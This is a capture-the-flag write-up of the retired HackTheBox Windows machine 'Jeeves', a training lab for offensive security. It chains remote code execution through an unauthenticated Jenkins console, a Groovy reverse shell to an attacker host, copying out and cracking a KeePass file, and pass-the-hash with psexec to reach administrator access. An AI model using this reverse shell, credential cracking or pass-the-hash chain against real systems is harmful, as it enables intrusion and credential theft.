# HackTheBox — Jeeves

**Platform:** HackTheBox  
**Difficulty:** Hard  
**OS:** Windows  
**Category:** Jenkins RCE / KeePass / Pass-the-Hash / Alternate Data Streams  
**Status:** Retired  

---

## Summary

Jeeves is a Hard Windows box that chains together Jenkins Groovy script console RCE, cracking a KeePass database to recover a NTLM hash, and using Pass-the-Hash for Administrator access. The root flag is hidden in an NTFS Alternate Data Stream — a clever forensics twist.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -p- --min-rate 5000 -oA nmap/jeeves 10.10.10.63
```

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
```

Port 50000 is interesting — Jetty web server (Jenkins commonly runs here).

---

## Web Enumeration

### Port 80 — IIS

Default IIS page or a trolling "Ask Jeeves" error page. Dead end.

### Port 50000 — Jenkins

```bash
gobuster dir -u http://10.10.10.63:50000/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
/askjeeves   (Status: 302)
```

Visiting `http://10.10.10.63:50000/askjeeves` redirects to a Jenkins dashboard — **no authentication required!**

---

## Initial Access — Jenkins Groovy Script Console

Jenkins has a built-in Groovy script console at:

```
http://10.10.10.63:50000/askjeeves/script
```

This executes arbitrary Groovy (and thus Java) code on the server.

### Test RCE

```groovy
println "whoami".execute().text
```

```
jeeves\kohsuke
```

### Reverse Shell via Groovy

```groovy
String host = "10.10.14.X"
int port = 4444
String cmd = "cmd.exe"
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new Socket(host, port)
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream()
OutputStream po = p.getOutputStream(), so = s.getOutputStream()
while (!s.isClosed()) {
    while (pi.available() > 0) so.write(pi.read())
    while (pe.available() > 0) so.write(pe.read())
    while (si.available() > 0) po.write(si.read())
    so.flush(); po.flush()
    Thread.sleep(50)
    try { p.exitValue(); break } catch (Exception e) {}
}
p.destroy(); s.close()
```

Start listener:

```bash
nc -lvnp 4444
```

Shell as **jeeves\kohsuke**.

---

## User Flag

```cmd
type C:\Users\kohsuke\Desktop\user.txt
```

---

## Privilege Escalation

### Finding the KeePass Database

```powershell
Get-ChildItem -Path C:\Users\kohsuke -Recurse -Include *.kdbx -ErrorAction SilentlyContinue
```

```
C:\Users\kohsuke\Documents\CEH.kdbx
```

### Transfer the KeePass Database

```bash
# On attacker machine — set up SMB server
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .

# On target
copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.14.X\share\
```

### Crack the KeePass Master Password

```bash
keepass2john CEH.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Password: **moonshine1**

### Open the Database

```bash
keepassxc CEH.kdbx
# or
python3 -m pykeepass  (scripted)
```

Entries inside:
- `Backup stuff` → password: `aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00`

This is an **NTLM hash** (LM:NT format)!

### Pass-the-Hash

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 \
  administrator@10.10.10.63
```

Or with Metasploit:

```bash
use exploit/windows/smb/psexec
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
set RHOSTS 10.10.10.63
run
```

**SYSTEM shell obtained.**

---

## Root Flag — NTFS Alternate Data Stream

```cmd
dir C:\Users\Administrator\Desktop\
```

```
hm.txt    (36 bytes)
```

```cmd
type C:\Users\Administrator\Desktop\hm.txt
```

```
The flag is elsewhere. Look deeper.
```

Trolled! Check for NTFS Alternate Data Streams:

```cmd
dir /R C:\Users\Administrator\Desktop\
```

```
hm.txt
hm.txt:root.txt:$DATA
```

There it is! Read the ADS:

```cmd
more < C:\Users\Administrator\Desktop\hm.txt:root.txt
```

**Root flag obtained.**

---

## Key Takeaways

- **Jenkins with no auth** = instant RCE via the Groovy script console — always check `/script`
- Unusual ports (50000) often host internal tools — enumerate them thoroughly with gobuster
- KeePass `.kdbx` files are crackable with `keepass2john` + `john` if the master password is weak
- **Pass-the-Hash** (PtH) works with just the NTLM hash — no need to crack it
- **NTFS Alternate Data Streams** can hide files — always use `dir /R` on Windows CTF desktops
- `more < file.txt:stream` or `Get-Content -Stream` reads ADS content

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| gobuster | Jenkins path discovery |
| Jenkins Groovy Console | RCE |
| impacket smbserver | File transfer |
| keepass2john + john | KeePass cracking |
| KeePassXC | Database inspection |
| psexec.py | Pass-the-Hash |
| dir /R | ADS enumeration |
